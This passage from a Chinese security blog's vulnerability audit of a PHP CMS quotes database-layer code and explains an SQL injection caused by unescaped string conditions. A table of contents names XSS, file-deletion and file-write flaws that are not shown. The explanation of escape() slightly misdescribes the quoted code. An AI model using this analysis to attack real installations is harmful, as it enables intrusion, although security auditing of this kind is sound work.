		$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">options</span>[<span style="color:#e6db74">&#39;where&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>;
		$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">options</span>[<span style="color:#e6db74">&#39;group&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>;
		$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">options</span>[<span style="color:#e6db74">&#39;having&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>;
		$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">options</span>[<span style="color:#e6db74">&#39;order&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>;
		$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">options</span>[<span style="color:#e6db74">&#39;limit&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>;
		$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">options</span>[<span style="color:#e6db74">&#39;field&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;*&#39;</span>;		
		<span style="color:#66d9ef">return</span> $condition;		
	}
}
</code></pre></div><p>这个函数是在<code>protected/include/core/db/cpMysql.class.php</code>的128行</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">	<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">parseCondition</span>($options) {
		$condition <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>;
		<span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#66d9ef">empty</span>($options[<span style="color:#e6db74">&#39;where&#39;</span>])) {
			$condition <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34; WHERE &#34;</span>;
			<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">is_string</span>($options[<span style="color:#e6db74">&#39;where&#39;</span>])) {
				$condition <span style="color:#f92672">.=</span> $options[<span style="color:#e6db74">&#39;where&#39;</span>];
			} <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">is_array</span>($options[<span style="color:#e6db74">&#39;where&#39;</span>])) {
					<span style="color:#66d9ef">foreach</span>($options[<span style="color:#e6db74">&#39;where&#39;</span>] <span style="color:#66d9ef">as</span> $key <span style="color:#f92672">=&gt;</span> $value) {
						 $condition <span style="color:#f92672">.=</span> <span style="color:#e6db74">&#34; `</span><span style="color:#e6db74">$key</span><span style="color:#e6db74">` = &#34;</span> <span style="color:#f92672">.</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">escape</span>($value) <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34; AND &#34;</span>;
					}
					$condition <span style="color:#f92672">=</span> <span style="color:#a6e22e">substr</span>($condition, <span style="color:#ae81ff">0</span>,<span style="color:#f92672">-</span><span style="color:#ae81ff">4</span>);	
			} <span style="color:#66d9ef">else</span> {
				$condition <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>;
			}
		}
		
		<span style="color:#66d9ef">if</span>( <span style="color:#f92672">!</span><span style="color:#66d9ef">empty</span>($options[<span style="color:#e6db74">&#39;group&#39;</span>]) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">is_string</span>($options[<span style="color:#e6db74">&#39;group&#39;</span>]) ) {
			$condition <span style="color:#f92672">.=</span> <span style="color:#e6db74">&#34; GROUP BY &#34;</span> <span style="color:#f92672">.</span> $options[<span style="color:#e6db74">&#39;group&#39;</span>];
		}
		<span style="color:#66d9ef">if</span>( <span style="color:#f92672">!</span><span style="color:#66d9ef">empty</span>($options[<span style="color:#e6db74">&#39;having&#39;</span>]) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">is_string</span>($options[<span style="color:#e6db74">&#39;having&#39;</span>]) ) {
			$condition <span style="color:#f92672">.=</span> <span style="color:#e6db74">&#34; HAVING &#34;</span> <span style="color:#f92672">.</span>  $options[<span style="color:#e6db74">&#39;having&#39;</span>];
		}
		<span style="color:#66d9ef">if</span>( <span style="color:#f92672">!</span><span style="color:#66d9ef">empty</span>($options[<span style="color:#e6db74">&#39;order&#39;</span>]) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">is_string</span>($options[<span style="color:#e6db74">&#39;order&#39;</span>]) ) {
			$condition <span style="color:#f92672">.=</span> <span style="color:#e6db74">&#34; ORDER BY &#34;</span> <span style="color:#f92672">.</span>  $options[<span style="color:#e6db74">&#39;order&#39;</span>];
		}
		<span style="color:#66d9ef">if</span>( <span style="color:#f92672">!</span><span style="color:#66d9ef">empty</span>($options[<span style="color:#e6db74">&#39;limit&#39;</span>]) <span style="color:#f92672">&amp;&amp;</span> (<span style="color:#a6e22e">is_string</span>($options[<span style="color:#e6db74">&#39;limit&#39;</span>]) <span style="color:#f92672">||</span> <span style="color:#a6e22e">is_numeric</span>($options[<span style="color:#e6db74">&#39;limit&#39;</span>])) ) {
			$condition <span style="color:#f92672">.=</span> <span style="color:#e6db74">&#34; LIMIT &#34;</span> <span style="color:#f92672">.</span>  $options[<span style="color:#e6db74">&#39;limit&#39;</span>];
		}
		<span style="color:#66d9ef">if</span>( <span style="color:#66d9ef">empty</span>($condition) ) <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;&#34;</span>;
        <span style="color:#66d9ef">return</span> $condition;
	}
</code></pre></div><p>里面有一个行数来过滤<code>escape</code>,我们找到74行的这个函数定义</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">	<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">escape</span>($value) {
		<span style="color:#66d9ef">if</span>( <span style="color:#a6e22e">isset</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">_readLink</span>) ) {
            $link <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">_readLink</span>;
        } <span style="color:#66d9ef">elseif</span>( <span style="color:#a6e22e">isset</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">_writeLink</span>) ) {
            $link <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">_writeLink</span>;
        } <span style="color:#66d9ef">else</span> {
            $link <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">_getReadLink</span>();
        }

		<span style="color:#66d9ef">if</span>( <span style="color:#a6e22e">is_array</span>($value) ) { 
		   <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">array_map</span>(<span style="color:#66d9ef">array</span>($this, <span style="color:#e6db74">&#39;escape&#39;</span>), $value);
		} <span style="color:#66d9ef">else</span> {
		   <span style="color:#66d9ef">if</span>( <span style="color:#a6e22e">get_magic_quotes_gpc</span>() ) {
			   $value <span style="color:#f92672">=</span> <span style="color:#a6e22e">stripslashes</span>($value);
		   } 
			<span style="color:#66d9ef">return</span>	<span style="color:#e6db74">&#34;&#39;&#34;</span> <span style="color:#f92672">.</span> <span style="color:#a6e22e">mysql_real_escape_string</span>($value, $link) <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;&#39;&#34;</span>;
		}
	}
</code></pre></div><p>不过这个函数有一句<code>is_array</code>如果是数组才会执行下面的过滤，如果不是的话就正常执行下去,没有任何sql的过滤就造成了注入漏洞。</p>
<h1 id="0x07-参考">0x07 参考</h1>
<p>程序下载：https://www.lanzous.com/i1w4bsb
<a href="https://xz.aliyun.com/t/2734">https://xz.aliyun.com/t/2734</a>
<a href="https://bbs.ichunqiu.com/thread-22002-1-1.html">https://bbs.ichunqiu.com/thread-22002-1-1.html</a>
<a href="http://ceye.io">http://ceye.io</a></p>
</div>
<div style="position: fixed; right:50px; max-width:255px; overflow:auto; top: 120px; width: 220px; bottom:90px">










<div class="toc">

    <div class="page-header"><strong>目录</strong></div>

    <div id="page-scrollspy" class="toc-nav">

        
        
            
                
                
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#0x01%e5%89%8d%e8%a8%80">
                            0x01前言
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#0x02-%e5%ae%89%e8%a3%85%e7%a8%8b%e5%ba%8f">
                            0x02 安装程序
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#0x03-%e5%89%8d%e5%8f%b0xss">
                            0x03 前台XSS
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#1%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0">
                            1.漏洞复现
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#2%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90">
                            2.漏洞分析
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#0x04-%e4%bb%bb%e6%84%8f%e6%96%87%e4%bb%b6%e5%88%a0%e9%99%a4">
                            0x04 任意文件删除
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#1%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0-1">
                            1.漏洞复现
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#2%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90-1">
                            2.漏洞分析
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#0x05-%e4%bb%bb%e6%84%8f%e6%96%87%e4%bb%b6%e5%86%99%e5%85%a5">
                            0x05 任意文件写入
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#1%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0-2">
                            1.漏洞复现
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#2%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90-2">
                            2.漏洞分析
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#0x06-sql%e6%b3%a8%e5%85%a5">
                            0x06 SQL注入
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#1%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0-3">
                            1.漏洞复现
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#2%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90-3">
                            2.漏洞分析
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#0x07-%e5%8f%82%e8%80%83">
                            0x07 参考
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                
            
        

    </div>

</div>



</div>

  </article>
</main>
<footer>
  <div>
    <div>&copy; 2021 F0rmat. <a href="https://creativecommons.org/licenses/by/4.0/deed.zh">CC-BY-4.0</a></div>
  </div>
</footer>
</body>
</html>
